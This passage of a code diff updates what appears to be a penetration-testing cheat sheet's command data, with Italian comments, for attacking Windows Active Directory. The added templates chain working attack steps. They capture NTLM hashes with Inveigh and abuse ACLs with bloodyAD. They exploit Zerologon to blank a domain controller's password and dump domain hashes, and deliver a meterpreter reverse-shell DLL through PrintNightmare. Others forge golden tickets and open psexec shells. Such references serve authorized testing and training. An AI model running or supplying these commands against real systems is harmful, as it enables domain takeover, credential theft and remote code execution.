+      "netntlmv2",
+      "poisoning"
+    ],
+    "template": ".\\Inveigh.exe",
+    "params": [],
+    "variants": [
+      {
+        "id": "csharp",
+        "label": "InveighZero (C#)",
+        "template": ".\\Inveigh.exe",
+        "description": "Build C# moderna, più stealth. Avvia la cattura LLMNR/NBT-NS/mDNS; comandi runtime come `GET NTLMV2` elencano gli hash catturati."
+      },
+      {
+        "id": "powershell",
+        "label": "Inveigh (PowerShell)",
+        "template": "Import-Module .\\Inveigh.ps1\nInvoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y",
+        "description": "Versione PowerShell: comoda ma intercettata da AMSI. `-ConsoleOutput Y` stampa gli hash a schermo."
       }
     ]
   },
@@ -13526,7 +15490,7 @@ const COMMANDS = [
       "acl",
       "writeowner"
     ],
-    "template": "bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' set owner <target> <user>",
+    "template": "# ti assegna la proprietà dell'oggetto target\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' set owner <target> <user>\n\n# da proprietario, ti concedi GenericAll sull'oggetto\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' add genericAll <target> <user>",
     "params": [
       {
         "key": "ip",
@@ -13690,7 +15654,7 @@ const COMMANDS = [
       "genericwrite",
       "uac"
     ],
-    "template": "bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' add uac <target> -f DONT_REQ_PREAUTH",
+    "template": "# disattiva la pre-autenticazione Kerberos sull'account target\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' add uac <target> -f DONT_REQ_PREAUTH\n\n# richiede l'AS-REP e salva l'hash in formato hashcat\nimpacket-GetNPUsers <domain>/<target> -dc-ip <ip> -no-pass -format hashcat\n\n# cleanup: rimette la pre-autenticazione come l'hai trovata\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' remove uac <target> -f DONT_REQ_PREAUTH",
     "params": [
       {
         "key": "ip",
@@ -13912,7 +15876,7 @@ const COMMANDS = [
       "forcechangepassword",
       "genericall"
     ],
-    "template": "# ForceChangePassword: resetta la password del target\nbloodyAD --host <ip> -d <domain> -u <user> -p '<password>' set password <target> 'Newpass123!'",
+    "template": "bloodyAD --host <ip> -d <domain> -u <user> -p '<password>' set password <target> 'Newpass123!'",
     "params": [
       {
         "key": "user",
@@ -14100,7 +16064,7 @@ const COMMANDS = [
       "constrained",
       "s4u"
     ],
-    "template": "impacket-getST -spn '<spn>' -impersonate Administrator -dc-ip <ip> '<domain>/<user>:<password>'",
+    "template": "# richiede un TGS per lo SPN impersonando Administrator\nimpacket-getST -spn '<spn>' -impersonate Administrator -dc-ip <ip> '<domain>/<user>:<password>'\n\n# punta la cache Kerberos al ticket appena ottenuto\nexport KRB5CCNAME='Administrator@<spn>@<domain>.ccache'\n\n# usa il ticket per aprire una shell sull'host target\nimpacket-psexec -k -no-pass <host>",
     "params": [
       {
         "key": "spn",
@@ -14782,7 +16746,7 @@ const COMMANDS = [
       "esc10",
       "esc13"
     ],
-    "template": "certipy-ad template -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -template <template> -save-old",
+    "template": "# salva la configurazione attuale del template, da ripristinare dopo\ncertipy-ad template -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -template <template> -save-old\n\n# rende il template vulnerabile: l'enrollee fornisce il subject\ncertipy-ad template -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -template <template>\n\n# richiede un certificato come Administrator sfruttando il template\ncertipy-ad req -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -ca <ca> -template <template> -upn Administrator@<domain>\n\n# cleanup obbligatorio: rimette il template come l'hai trovato\ncertipy-ad template -u '<user>@<domain>' -p '<password>' -dc-ip <ip> -template <template> -configuration <template>.json",
     "params": [
       {
         "key": "user",
@@ -15019,7 +16983,7 @@ const COMMANDS = [
       "cve-2020-1472",
       "netlogon"
     ],
-    "template": "python3 zerologon_tester.py <dchost> <ip>",
+    "template": "# azzera la password del computer account del DC\npython3 set_empty_pw.py <dchost> <ip>\n\n# con la password vuota, replica gli hash del dominio\nimpacket-secretsdump '<domain>/<dchost>$@<ip>' -no-pass -just-dc",
     "params": [
       {
         "key": "dchost",
@@ -15154,7 +17118,7 @@ const COMMANDS = [
       "cve-2021-1675",
       "rce"
     ],
-    "template": "python3 CVE-2021-1675.py <domain>/<user>:'<password>'@<ip> '\\\\<lhost>\\share\\payload.dll'",
+    "template": "# genera la DLL con il payload meterpreter\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<lhost> LPORT=8080 -f dll -o payload.dll\n\n# la pubblica su una share SMB raggiungibile dal target\nsudo impacket-smbserver -smb2support share ./\n\n# fa caricare la DLL allo spooler del target\npython3 CVE-2021-1675.py <domain>/<user>:'<password>'@<ip> '\\\\<lhost>\\share\\payload.dll'",
     "params": [
       {
         "key": "ip",
@@ -15287,7 +17251,7 @@ const COMMANDS = [
       "extrasid",
       "sid-history"
     ],
-    "template": "impacket-ticketer -nthash <krbtgt> -domain <childdomain> -domain-sid <childsid> -extra-sid <parentsid>-519 hacker",
+    "template": "# forgia un golden ticket con il SID degli Enterprise Admins del dominio padre\nimpacket-ticketer -nthash <krbtgt> -domain <childdomain> -domain-sid <childsid> -extra-sid <parentsid>-519 hacker\n\n# punta la cache Kerberos al ticket forgiato\nexport KRB5CCNAME=hacker.ccache\n\n# usa il ticket per una shell sul DC del dominio padre\nimpacket-psexec <childdomain>/hacker@<parentdc> -k -no-pass",
     "params": [
       {
         "key": "krbtgt",
@@ -15959,7 +17923,7 @@ const COMMANDS = [
       "dcomexec",
       "dcom"
     ],
-    "template": "impacket-dcomexec <domain>/<user>:<password>@<ip>",
+    "template": "impacket-dcomexec <domain>/<user>:<password>@<ip> -object MMC20",
     "params": [
       {
         "key": "domain",
@@ -16434,7 +18398,7 @@ const COMMANDS = [
       "pivot",
       "tun"
     ],
-    "template": "./proxy -selfcert -laddr 0.0.0.0:11601",
+    "template": "sudo ip tuntap add user $(whoami) mode tun ligolo; sudo ip link set ligolo up; ./proxy -selfcert -laddr 0.0.0.0:11601",
     "params": [
       {
         "key": "lhost",
